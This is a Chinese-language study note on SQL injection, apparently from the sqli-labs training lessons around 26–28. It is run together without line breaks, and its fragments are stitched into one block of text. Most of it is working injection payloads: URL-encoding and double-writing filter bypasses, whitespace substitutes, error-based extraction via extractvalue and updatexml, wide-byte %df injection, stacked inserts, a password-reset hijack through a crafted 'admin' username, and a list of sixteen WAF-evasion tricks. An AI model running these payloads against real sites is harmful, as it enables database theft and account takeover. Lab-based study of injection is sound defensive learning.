class-26巨坑class-28update insert不能用#注释，语句不完整分析目标防火墙规则并跳过1.封IP  2.消掉关键字，但凡侦测到，直接替换为空 aandnd,  大小写是否敏感突破防火墙urldecode  先编码，后解码   防止url注入漏洞第一种：屏蔽--+ #  -----and '1'='11、select group(username) from users where 1=1 and '1'='1(需要添加where否则报错）？id=1'' 进行url编码 %27（传过去url编码来过墙）所有的GET请求都会进行url编码过滤-- #-1' union select 1,2,'3select * from users where id = '-1  ' union select 1,2,'3  ' limit 0,1-1' union select 1,database(),'3-------------------必要的时候对操作进行url编码第二种：越权改密(注册账号时，没有规范用户名）$new_pass1=$_POST['new_pass1'];当可以注册用户的时候，我们思考一下能不能通过自己修改密码去修改别人的密码新注册一个用户名admin '# 密码随意   不是admin ')#那么修改这个用户名密码的时候，其实是修改admin用户的密码密码重置update users set password="$new_pass" where username="$user" and password="$old_pass";admin' #update users set password='123' where username='admin' #----------------------第三种：屏蔽空格  用其他符号代替屏蔽or and 空格 --+ # /**/代替空格的东西%09 水平tab键%0a 新建一行%0c  新建一页%0d  回车键%0b  垂直tab键%a0  也可以是空格键（大多数情况用）也可以用（）分隔，确保语句正确屏蔽and or但凡侦测到了，直接替换为空（尝试找到他过滤几遍oorr ooorrr)aandnd&& ||%26%26id=1' || extractvalue(1,concat(0x7e,(select database()),0x7e))--+id=1%27||(updatexml(1,concat(0x7e,(select(group_concat(table_name))from(information_schema.tables)where(table_schema)like(database())),0x7e),1))||1=%27不用空格进行注入  less-26GET提交考虑url编码第四种：宽字节注入屏蔽 空格 - union select/?id=10000000'%0buNion%0bsElect%0b1,2,3 ||  '1'='1--------------------宽字节注入mysql用gbk编码，把2个字符当作一个汉字存在%df吃掉\，因为urlencode(\')= %5c%27，如果前面加上%df，%df%5c是一个汉字,%27会独立出来id=-2%df' union select 1,2,3 --+database() 或者使用ASCII16进制编码，来避免“的使用----------------------重要！在post情况下的宽字节注入，得直接在burp的post数据包中修改，因为前端提交的时候和直接在数据包中修改，前端的不会变成中文uname=admi%df' union select 1,2 #&passwd=admin&submit=Submitgbk 编码漏洞字符采用unicode  编码，没有此类漏洞url白名单admin、pwd......去绕防火墙堆叠注入id=1';insert into users(username,password)values('zj123','xxxx') --+网站是那种需要注册码的注册` 反引号里面的不是命令，不和table关键字冲突SELECT * FROM users WHERE username='admin' or '1'='1 ' AND password='$password'SELECT * FROM users WHERE username='x' union select 1,'admin',md5('admin') # 'x' union select 1,'admin',md5('admin') #admin----------UPDATE noescvotes SET `$who`=`$who`+1 WHERE id=1UPDATE noescvotes SET `bill`=111,`george`=`george`=`bill`=111,`george`=`george`+1 WHERE id=1bill`=111,`george`=`george ` 反引号很重要以后写数据库语句的时候，最好用反引号反引号修饰表名，列名插入数据可以使用''奇淫巧计：1.大小写绕过UniOn SeleCT2.双写绕过union seleselectct3.编码绕过ASCII'scurity' = 0x736375726974794.注释符uni/**/on sel/**/ect5.空格绕过6.or and绕过and == &&or == ||7.内联函数/!*select*/ 1,2,38.<>绕过uni<>on9.屏蔽逗号select substr('security',1,3)select substr('security' from 1 for 3)union select 1,2,3union select * from (select 1)a join (select 2)b join (select 3)climit 0,1limit 0 offset 110.sleep屏蔽and sleep(1)and benchmark(100000000,1)11.group_concat屏蔽select group_concat('x','y')select group_ws('','x','y')12.=屏蔽like rlike regexp <>id =1' or '1' like '113.POST屏蔽#考虑使用-- a大部分情况可以当作#用uname=admin -- a&passwd=admin14.特殊符号过waf/*!50001 select * from users */这里的50001=如果数据库版本是5.00.01以上的版本，这个语句才会被执行15.ip地址拦截放在burp的数据包中的x-forward-forx-remote-ipx-originating-ipx-remote-addrx-real-ip16.修改资源http://www.xx.com/sql.php?id=1http://www.xx.com/sql.php/1.js?id=1
